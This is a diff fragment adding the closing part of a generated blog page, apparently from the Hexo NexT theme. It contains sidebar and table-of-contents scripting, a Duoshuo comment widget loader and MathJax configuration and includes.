+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = NexT.utils.escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    NexT.motion.middleWares.sidebar = function () {
+      var $tocContent = $('.post-toc-content');
+
+      if (CONFIG.sidebar.display === 'post' || CONFIG.sidebar.display === 'always') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          NexT.utils.displaySidebar();
+        }
+      }
+    };
+  });
+</script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=0.5.0"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"watercow2"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+  
+
+
+
+
+
+  
+  
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+  </script>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  </script>
+
+  
+    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
+    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
+  
+
+
+  
+  
+
+
+</body>
+</html>
